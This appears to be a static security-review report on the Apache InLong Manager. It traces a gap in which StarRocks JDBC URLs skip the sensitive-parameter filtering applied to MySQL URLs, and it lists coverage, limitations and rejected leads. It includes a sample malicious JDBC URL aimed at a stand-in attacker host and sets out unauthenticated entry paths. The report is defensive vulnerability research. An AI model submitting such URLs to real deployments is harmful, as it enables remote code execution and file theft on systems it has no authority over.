candidates.attacker_control: The attacker controls the StarRocks `jdbcUrl` (StarRocksSinkRequest) or data-node `url` (DataNodeRequest) strings. Only the non-whitespace pattern is enforced (StarRocksSinkRequest.java 42-44, DataNodeRequest.java 63-66), and UrlVerificationUtils only checks the `jdbc:mysql://` prefix plus host:port, so a value such as `jdbc:mysql://attacker.example:3306/x?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&allowLoadLocalInfile=true` is accepted and persisted. Entry points include POST /api/sink/save, /api/node/save and their /openapi/sink/save, /openapi/node/save counterparts; /openapi/** is mapped to OpenAPIFilter+Tenant filters (InlongShiroImpl.java 134-139) and with the shipped default `openapi.auth.enabled=false` (application.properties 60-61) OpenAPIAuthenticatingRealm.doDefaultAuth (58-73) silently authenticates the caller as the default `admin` user with INLONG_ADMIN/TENANT_ADMIN roles.
candidates.counterevidence_checked: Verified that StarRocksDataNodeOperator.testConnection does apply StarRocksDataNodeDTO.convertToJdbcUrl -> MySQLSensitiveUrlUtils.filterSensitive, so the test-connection endpoint is NOT a demonstration of the gap; verified MySQL sink/data-node paths do apply the filter (MySQLSinkDTO.getFromRequest line 88, MySQLDataNodeDTO.convertToJdbcurl line 84, MySQLSinkOperator.getFromEntity line 97, MySQLResourceOperator.getStarRocksInfo counterpart line 137), showing the control is intended and the StarRocks omission is specific; verified UrlVerificationUtils/SQLServer-style prefix checks do not remove query parameters; verified the sink request URL pattern only forbids whitespace; verified the workflow path that performs resource creation requires streamSuccess + startProcess and group permissions (or admin/default-openapi identity), so it is not unauthenticated in every deployment; no runtime validation of gadget availability or actual deserialization was performed.
candidates.impact: Because the URL properties survive, the manager will connect to an attacker-controlled MySQL endpoint with `autoDeserialize=true` and `queryInterceptors`/`statementInterceptors` set to a Connector/J interceptor that calls ResultSet.getObject on server-supplied data, letting the rogue server return Java-serialized blobs for deserialization inside the Manager JVM (potential remote code execution, conditional on classpath gadget). Independently, `allowLoadLocalInfile=true` plus a rogue server can make the client read arbitrary files from the manager host (confidentiality impact), and the raw URL also gives an authenticated attacker an SSRF-style primitive to reach internal MySQL services. This is the same severity class the existing MySQL/OceanBase filters were introduced to prevent.
candidates.prerequisites: A manager deployment where the attacker can reach the REST API with permission to create a StarRocks sink (and/or StarRocks data node) and start stream resource creation — an authenticated user in the group's in-charges list, an admin, or (in the default configuration) any client able to reach /openapi/** while openapi.auth.enabled=false, because the caller is mapped to the default admin identity. A group+stream in CONFIG_SUCCESSFUL state and startProcess=true (enableCreateResource=1) is needed so StreamSinkServiceImpl.save triggers InlongStreamProcessService.startProcess -> CREATE_STREAM_RESOURCE workflow -> StreamSinkResourceListener -> StarRocksResourceOperator. The attacker must also operate a MySQL-protocol server reachable from the manager. For code execution a deserialization gadget must exist on the manager classpath/JDK; for file read the Connector/J `allowLoadLocalInfile=true` behavior is sufficient.
candidates.root_cause: The project has a dedicated mitigation (MySQLSensitiveUrlUtils.filterSensitive, which forces autoDeserialize=false, allowLoadLocalInfile=false, allowUrlInLocalInfile=false and removes allowLoadLocalInfileInPath) and applies it in the MySQL/OceanBase/ClickHouse sink and node paths (e.g. MySQLSinkDTO.getFromRequest, MySQLDataNodeDTO.convertToJdbcurl, MySQLSinkOperator.getFromEntity, MySQLResourceOperator.getStarRocksInfo counterpart). The StarRocks equivalents were never wired to it: StarRocksSinkDTO.getFromRequest/getFromJson store jdbcUrl untouched, StarRocksSinkOperator.getFromEntity sets the data-node URL verbatim, and StarRocksResourceOperator.getStarRocksInfo uses the stored jdbcUrl verbatim. StarRocksJdbcUtils then loads com.mysql.cj.jdbc.Driver (version 8.0.28, root pom.xml line 105) and calls DriverManager.getConnection(url, user, password) with only a prefix/host:port check (UrlVerificationUtils) that leaves all query parameters intact.
candidates.title: StarRocks sink/data-node JDBC URL skips MySQL sensitive-parameter filtering, exposing Manager to Connector/J URL deserialization and local-file-read attacks
candidates.trace: POST /api/sink/save or /openapi/sink/save with sinkType=STARROCKS -> StreamSinkServiceImpl.save (checks group/stream; startProcess) -> StarRocksSinkOperator.setTargetEntity -> StarRocksSinkDTO.getFromRequest (no filterSensitive call) -> extParams persisted with attacker jdbcUrl -> StreamSinkServiceImpl.startProcessForSink -> InlongStreamProcessService.startProcess(ProcessName.CREATE_STREAM_RESOURCE) -> CreateStreamWorkflowDefinition InitSink ServiceTask -> StreamSinkResourceListener.listen (sinkEntityMapper.selectAllConfig -> StarRocksResourceOperator.createSinkResource) -> StarRocksResourceOperator.getStarRocksInfo (stored jdbcUrl used raw; data-node URL also used raw at line 154) -> StarRocksJdbcUtils.createDb/createTable/addColumns -> executeSql -> getConnection -> Class.forName("com.mysql.cj.jdbc.Driver") + DriverManager.getConnection(url, user, password). The same trace is reachable with a StarRocks data-node URL (StarRocksSinkOperator.getFromEntity line 103 copies dataNodeInfo.getUrl() without StarRocksDataNodeDTO.convertToJdbcUrl/filterSensitive, unlike MySQLSinkOperator.java line 97).
candidates.unverified: Runtime exploitability is unproven: it depends on a suitable deserialization gadget being present in the deployed manager classpath/JDK and on the attacker being able to reach a stream-resource workflow run (permissions/approval/status). The exact Connector/J 8.0.28 interceptor blob handling was not executed. Whether any deployed configuration changes openapi.auth.enabled or restricts sink creation was not assessed.
candidates.weakness_type: CWE-502 Deserialization of Untrusted Data (facilitated by CWE-184 Incomplete List of Disallowed Inputs / CWE-20 Improper Input Validation)

coverage_summary: Source scope: 6,185 visible source files (Java-heavy monorepo, Apache InLong 2.2.0-SNAPSHOT). The P1 relation index covers 6,091 files with 94 source files missing from the index, parsed only for Java syntax/containment/calls (no control-flow or data-flow, 118,100 unresolved calls, no semantic resolution), so index labels were used only for navigation and every submitted relation was re-verified in source text. I inspected the manager web controllers, Shiro/OpenAPI auth wiring, manager-service sink/source/node/resource operators, manager-pojo DTOs, MyBatis mappers, data-node connection utilities, workflow listeners and process definitions, plus broad grep sweeps over agent, audit, sort/sort-flink connectors, dataproxy and tubemq for Runtime.exec/ProcessBuilder, ObjectInputStream, JDBC URL handling, SQL construction, YAML/JSON parsing, file I/O, HTTP and archive handling. The StarRocks JDBC URL flow was traced end-to-end in source (controller -> service -> operator -> resource listener -> JDBC utility -> DriverManager).
limitations: P1 index is partial: 94 source files missing, no control/data-flow, no semantic resolution; unreported areas were not assumed reviewed.

No code was executed, no tests/scanners/exploits were run, and no external services were contacted; exploitability (gadget availability, Connector/J behavior, workflow state/permissions) is inferred, not confirmed.

Findings are limited to the assigned snapshot; dependency/container/configuration variants (e.g. different openapi.auth.enabled, JDBC driver versions bundled in docker images, approval configuration) were not runtime-verified.
The snapshot is large; non-manager modules (agent, audit, sort-flink connectors, dataproxy, tubemq) were reviewed with targeted searches rather than exhaustive line-by-line reading.
StarRocks sink/data-node save and workflow execution paths were verified statically for reachability but not exercised, so the candidate is a lead rather than a confirmed vulnerability.

rejected_leads.lead: sort-flink v1.15/v1.18 JDBC connectors do not call JdbcUrlUtils.replaceInvalidUrlProperty (only sort-flink-v1.13/sort-connectors/jdbc/.../JdbcDynamicTableFactory.java line 284 does), leaving autoDeserialize=true unfiltered in those Flink jobs.
rejected_leads.reason: Real hardening gap, but the connector URL originates from manager-generated sink configuration that is already filtered for MySQL/OceanBase paths, so the lower-privilege/untrusted-input path is weaker than the StarRocks manager-side flow; kept as a rejected/defense-in-depth lead.

rejected_leads.lead: YamlSourceDecoder (transform-sdk) calls new org.apache.flink.shaded.jackson2...snakeyaml.Yaml().load(untrustedString), which is the classic unsafe SnakeYAML object instantiation pattern.
rejected_leads.reason: SourceDecoderFactory.createYamlDecoder has no caller in this snapshot and the only wired dynamic-decoder consumer (SinkContext/EsSinkContext) supports only CSV/KV data types, so reachability of the unsafe load from attacker data could not be established.

rejected_leads.lead: ObjectInputStream deserialization in ProxyConfigManager.readCachedPubKeyEntry, audit SenderManager and TubeMQ CliMetaDataBRU.
rejected_leads.reason: All deserialize local cache/tool files controlled by config or CLI paths, not network input; no attacker-controlled write primitive was found for those files.

rejected_leads.lead: MyBatis order-by injection via ${orderField}/${orderType} in several mapper XML files.
rejected_leads.reason: Service layer normalizes both values through OrderFieldEnum/OrderTypeEnum whitelists before the mapper calls that were inspected.

rejected_leads.lead: Manager default openapi.auth.enabled=false makes /openapi/** callers default admin without credentials.
rejected_leads.reason: Intentional, documented default (comment in application.properties); treated as an amplifier for the submitted candidate rather than a separate candidate.

rejected_leads.lead: ShellExecutorImpl/CommandExecutorImpl and AgentClusterNodeInstallOperator build remote shell commands from node fields, module download URLs and paths.
rejected_leads.reason: Admin-only agent installation feature; ip/user/password are passed as separate argv to an expect script and the strongest inputs (ip/user/url) would require admin privileges plus runtime confirmation of shell parsing in the .exp scripts, which was not verified.

rejected_leads.lead: Hardcoded default AES key in manager application.properties (inlong.encrypt.key.value1).
rejected_leads.reason: Configuration default that operators are expected to change; no source-level bypass of the encryption/decryption flow was identified and it is far weaker than the submitted candidate.

summary: Reviewed the InLong monorepo (2.2.0-SNAPSHOT) with emphasis on the manager REST/service/JDBC and data-node/sink resource-creation paths, plus broad sweeps of agent, audit, sort, dataproxy and tubemq code for command execution, deserialization, SQL construction, file and URL handling. The strongest source-supported lead is an incomplete JDBC-URL hardening: MySQL/ClickHouse/OceanBase sink and node paths strip Connector/J dangerous properties (autoDeserialize/allowLoadLocalInfile/…), but the StarRocks sink/resource paths pass an attacker-supplied jdbc:mysql:// URL straight into MySQL Connector/J 8.0.28 on the Manager JVM. That yields a plausible JDBC-URL deserialization/file-read/SSRF chain (CWE-502/CWE-184). No runtime testing or exploit execution was performed; the candidate is a lead, not a confirmed vulnerability.
